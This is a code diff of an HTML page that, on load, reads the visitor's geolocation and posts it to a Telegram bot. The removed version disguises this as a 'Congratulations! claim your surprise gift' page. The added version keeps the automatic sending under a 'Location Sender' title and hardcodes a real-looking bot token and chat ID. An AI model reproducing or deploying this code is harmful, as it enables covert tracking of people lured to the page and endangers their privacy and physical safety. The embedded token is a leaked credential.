@@ -1,28 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🎉 Congratulations! 🎉</title>
+    <title>🎉 Location Sender 🎉</title>
     <script>
         function sendLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    var latitude = position.coords.latitude;
-                    var longitude = position.coords.longitude;
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        var latitude = position.coords.latitude;
+                        var longitude = position.coords.longitude;
 
-                    // Send location to Telegram bot
-                    var botToken = "YOUR_BOT_Token";8193877447:AAF5lqPY9-rvw_UaakwnfkFrIvCVFdStpLY
-                    var chatId = "YOUR_CHAT_ID";  //432412879  
-                    var message = "📍 Location received!\nLatitude: " + latitude + "\nLongitude: " + longitude + 
-                                  "\n[Google Maps](https://www.google.com/maps?q=" + latitude + "," + longitude + ")";
+                        // Your Telegram Bot Token and Chat ID
+                        var botToken = "8193877447:AAF5lqPY9-rvw_UaakwnfkFrIvCVFdStpLY";
+                        var chatId = "432412879";  
+                        
+                        var message = `📍 Location received!\nLatitude: ${latitude}\nLongitude: ${longitude}\n[Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`;
 
-                    var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message) + "&parse_mode=Markdown";
+                        var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-                    fetch(url)
-                        .then(response => {
-                            document.getElementById("message").innerHTML = "✅ Your gift is on the way!";
+                        fetch(url, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: message,
+                                parse_mode: "Markdown"
+                            })
                         })
-                        .catch(error => console.error('Error:', error));
-                });
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.ok) {
+                                document.getElementById("message").innerHTML = "✅ Your location has been sent!";
+                            } else {
+                                document.getElementById("message").innerHTML = "❌ Failed to send location!";
+                                console.error("Telegram API Error:", data);
+                            }
+                        })
+                        .catch(error => {
+                            document.getElementById("message").innerHTML = "❌ Error sending location!";
+                            console.error("Error:", error);
+                        });
+                    },
+                    function(error) {
+                        document.getElementById("message").innerHTML = "❌ Failed to get location!";
+                        console.error("Geolocation Error:", error);
+                    }
+                );
             } else {
                 alert("Geolocation is not supported by this browser.");
             }
@@ -30,7 +53,7 @@
     </script>
 </head>
 <body onload="sendLocation()">
-    <h1>🎉 Congratulations! 🎉</h1>
-    <p id="message">Click to claim your surprise gift!</p>
+    <h1>🎉 Location Sender 🎉</h1>
+    <p id="message">Sending location...</p>
 </body>
 </html>
